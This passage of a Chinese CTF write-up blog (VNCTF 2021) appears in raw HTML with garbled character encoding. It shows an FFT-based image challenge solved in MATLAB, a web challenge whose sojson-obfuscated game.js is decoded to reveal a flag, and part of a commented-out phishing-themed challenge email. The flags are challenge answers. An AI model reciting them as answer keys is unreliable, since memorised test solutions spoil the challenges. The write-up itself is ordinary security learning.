èƒ½æ­£å¸¸æ‰“å¼€é‡Œé¢çš„å›¾ç‰‡ï¼Œè¿˜èƒ½æå–å‡ºæ¥ï¼Œé‚£å°±æ‡’äº†ï¼ˆè·‘</p><p><img src="/2021/03/15/CTF_2021VNCTF/FFT.png" alt="FFT"></p><p>ç„¶å fft è½¬æ¢åˆ°é¢‘åŸŸå°±èƒ½çœ‹åˆ° flagã€‚</p><pre class="language-matlab" data-language="matlab"><code class="language-matlab">clc<span class="token punctuation">;</span>clear<span class="token punctuation">;</span>close all<span class="token punctuation">;</span>im <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'FFT.png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>F<span class="token operator">=</span><span class="token function">fft2</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imshow</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è¿™é‡Œè¿˜æ²¡æœ‰åš <code>fftshift</code>ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œflag ä¹Ÿèƒ½å‡ºäº†ã€‚</p><p><img src="/2021/03/15/CTF_2021VNCTF/image-20210314210610993.png"></p><p><code>VNCTF{Ff5_1S_bEauTiful}</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h3><p>è¿™é¢˜æ¯”èµ›ç»“æŸå‰å‡ åˆ†é’Ÿæ¥çœ‹äº†çœ‹ï¼ˆ</p><p><code>game.js</code> è¿™é‡Œæœ‰ä¸€æ®µ sojson åŠ å¯†çš„ã€‚</p><p><img src="/2021/03/15/CTF_2021VNCTF/image-20210314220701188.png"></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token string">'sojson.v4'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x66\x69\x6c\x74\x65\x72"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'sojson.v4'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\x61\x70\x70\x6c\x79'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token string">"118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41"</span><span class="token punctuation">[</span><span class="token string">'\x73\x70\x6c\x69\x74'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[a-zA-Z]{1,}</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'sojson.v4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ¥ <a href="https://www.sojson.com/jsjiemi.html">https://www.sojson.com/jsjiemi.html</a> æˆ–è€… <a href="https://tool.lu/js">https://tool.lu/js</a> è¿™é‡Œè§£å¯†ä¸€ä¸‹ï¼Œå…¶å®å°±æ˜¯è§£ç äº†ä¸€ä¸‹ï¼ˆ</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token string">'sojson.v4'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"filter"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'sojson.v4'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'fromCharCode'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'apply'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41"</span> <span class="token punctuation">[</span><span class="token string">'split'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[a-zA-Z]{1,}</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'sojson.v4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ç›´æ¥åœ¨ console é‡ŒæŠŠæœ€åçš„ <code>('sojson.v4');</code> å»æ‰ï¼Œç„¶åæ‰§è¡Œå°±èƒ½åœ¨ sources é‡Œçœ‹åˆ°æºç ã€‚</p><p>å¾ˆæ˜æ˜¾å°±çœ‹åˆ° flag äº†ã€‚</p><p><img src="/2021/03/15/CTF_2021VNCTF/image-20210314220458150.png"></p><p><code>flag{this_game_is_funny!}</code></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å…¶å®å°±éšæ„çœ‹äº†çœ‹é¢˜ï¼Œè¿™ç¯‡æ–‡ç« å½“æ°´ä¸€æ°´å¥½äº†ã€‚</p><p><del>ï¼ˆç”šè‡³èººåœ¨è‰ç¨¿ç®±é‡Œé•¿è‰äº†ï¼Œè¿˜æ²¡å‘</del></p><p>å‘äº†å‘äº†ã€‚</p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p><!--### interesting_fishing> crazyman_armyæ˜¯æŸå®‰å…¨å…¬å¸çš„ç ”ç©¶äººå‘˜> è¿™å¤©ä»–çš„å…¶é‚®ç®±é‡Œå‘ç°äº†ä¸€å°å¥‡æ€ªçš„é‚®ä»¶ > ä½ èƒ½å¸®åŠ©ä»–æ‰¾åˆ°å…¶éšè—çš„ä¿¡æ¯å—>> æ³¨æ„:> é™„ä»¶æ˜¯ç¬¬ä¸€éƒ¨åˆ†çš„flag> å›¾ç‰‡æ˜¯ç¬¬äºŒéƒ¨åˆ†çš„flag> æœ€åflagä¸º ç¬¬ä¸€éƒ¨åˆ†+ç¬¬äºŒéƒ¨åˆ†>> hint:powershellè§£ç åçš„å­—ç¬¦å¯èƒ½å­˜åœ¨ä¸å¯è¯»çš„æƒ…å†µ é‚£å¹¶ä¸æ˜¯è§£ç é”™è¯¯<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=GB18030<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>æ‚¨å¥½,crazyman_army<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> æˆ‘æ˜¯ä¸€ä¸ªæ­£åœ¨å­¦ä¹ å®‰å…¨çš„å¤§ä¸€å­¦ç”Ÿ,ç›®å‰çœ‹è¿‡æ‚¨å…³äºå…¶çš„å¾ˆå¤šåˆ†ææŠ¥å‘Šä»¥åŠæ¼æ´å¤ç°çš„æ–‡ç« <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> æœ€è¿‘æˆ‘æ­£åœ¨å¼€å‘ä¸€ä¸ªé¡¹ç›®ç”¨äºè‡ªåŠ¨åŒ–æ ·æœ¬åˆ†æ åŒæ—¶è¿™æ˜¯æˆ‘å¯¹æŸå›½é»‘å®¢çš„ç ”ç©¶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> å¸Œæœ›æ‚¨èƒ½å¤ŸæŠ½å‡ºæ‚¨çš„å®è´µæ—¶é—´ç»™äºˆæˆ‘çš„ç›®å‰ç ”ç©¶ä¸€äº›å®è´µçš„å»ºè®®<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> è°¢è°¢<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://vnctf-213-1257061123.cos.ap-nanjing.myqcloud.com/ThisIsSecret.jpg<span class="token punctuation">"</span></span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">width</span><span class="token punctuation">:</span> 770px<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> 256px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img_insert_161259102178605354633598710636<span class="token punctuation">"</span></span> <span class="token attr-name">modifysize</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>51%<span class="token punctuation">"</span></span> <span class="token attr-name">diffpixels</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8px<span class="token punctuation">"</span></span> <span class="token attr-name">scalingmode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zoom<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" 